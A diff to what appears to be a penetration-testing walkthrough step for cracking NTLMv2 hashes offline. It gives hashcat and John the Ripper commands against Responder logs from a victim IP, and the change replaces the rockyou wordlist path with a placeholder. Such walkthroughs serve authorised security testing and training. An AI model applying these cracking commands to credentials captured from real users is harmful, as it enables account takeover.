@@ -38,18 +38,18 @@ Step 4 - Crack the hash offline
 
 Option A - hashcat (faster, needs GPU):
 
-    hashcat -m 5600 <hash-file> <wordlist> --force
+    hashcat -m 5600 <hash-file> <wordlist-path> --force
 
 Option B - John the Ripper (CPU-based, no GPU needed):
 
-    john --format=netntlmv2 --wordlist=<wordlist> <hash-file>
+    john --format=netntlmv2 --wordlist=<wordlist-path> <hash-file>
 
 Example with rockyou (hashcat):
     hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<victim-ip>.txt \
-            /usr/share/wordlists/rockyou.txt --force
+            <wordlist-path> --force
 
 Example with rockyou (john):
-    john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt \
+    john --format=netntlmv2 --wordlist=<wordlist-path> \
          /usr/share/responder/logs/SMB-NTLMv2-SSP-<victim-ip>.txt
 
 
